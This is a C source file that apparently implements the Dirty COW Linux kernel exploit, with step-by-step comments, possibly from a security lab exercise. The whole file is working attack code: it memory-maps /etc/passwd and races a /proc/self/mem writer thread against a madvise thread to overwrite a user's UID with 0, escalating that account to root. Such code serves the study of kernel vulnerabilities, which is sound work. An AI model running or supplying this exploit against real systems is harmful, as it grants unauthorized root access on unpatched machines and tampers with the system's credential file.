#include <stdio.h>         // for printf, perror
#include <stdlib.h>        // for exit
#include <unistd.h>        // for lseek, write, close
#include <fcntl.h>         // for open
#include <string.h>        // for strstr, strlen
#include <sys/mman.h>      // for mmap, madvise
#include <sys/stat.h>      // for fstat
#include <pthread.h>       // for pthreads
#include <stdint.h>        // for intptr_t

void *map;  // pointer to the memory-mapped file

// Function prototypes
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
    pthread_t pth1, pth2;
    struct stat st;
    int file_size;

    // Step 1: Open the target file in read-only mode
    int f = open("/etc/passwd", O_RDONLY);
    if (f < 0) {
        perror("open");
        exit(1);
    }

    // Step 2: Get file size
    if (fstat(f, &st) < 0) {
        perror("fstat");
        close(f);
        exit(1);
    }
    file_size = st.st_size;

    // Step 3: Memory map the file using MAP_PRIVATE (Copy-On-Write)
    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        close(f);
        exit(1);
    }

    // Step 4: Locate the string "testcow:x:1001" in /etc/passwd
    // This is the line we want to overwrite (change UID from 1001 to 0000)
    char *position = strstr(map, "testcow:x:1001");
    if (position == NULL) {
        fprintf(stderr, "Target string not found in /etc/passwd.\n");
        munmap(map, file_size);
        close(f);
        exit(1);
    }

    printf("Found target string at offset: %ld\n", (long)(position - (char *)map));

    // Step 5: Start two threads:
    // - one for writing the payload
    // - one for discarding the COW memory (madvise)
    pthread_create(&pth1, NULL, madviseThread, (void *)(intptr_t)file_size);
    pthread_create(&pth2, NULL, writeThread, position);

    // Wait for threads to complete (they usually run forever unless attack succeeds)
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    // Cleanup
    munmap(map, file_size);
    close(f);
    return 0;
}

// Thread 1: writeThread continuously writes to the mapped memory via /proc/self/mem
void *writeThread(void *arg)
{
    char *target = (char *)arg;
    char *replacement = "testcow:x:0000"; // change UID to 0 (root)
    size_t len = strlen(replacement);

    // Open the special memory file of this process
    int f = open("/proc/self/mem", O_RDWR);
    if (f < 0) {
        perror("open /proc/self/mem");
        pthread_exit(NULL);
    }

    while (1) {
        // Move the file pointer to the offset in memory
        lseek(f, (off_t)target, SEEK_SET);

        // Try writing the new content
        write(f, replacement, len);
    }
}

// Thread 2: madviseThread continuously discards private memory copy
void *madviseThread(void *arg)
{
    int file_size = (int)(intptr_t)arg;

    while (1) {
        // Tell the kernel we "don't need" the private copy anymore,
        // so it discards it and points back to the original memory
        madvise(map, file_size, MADV_DONTNEED);
    }
}
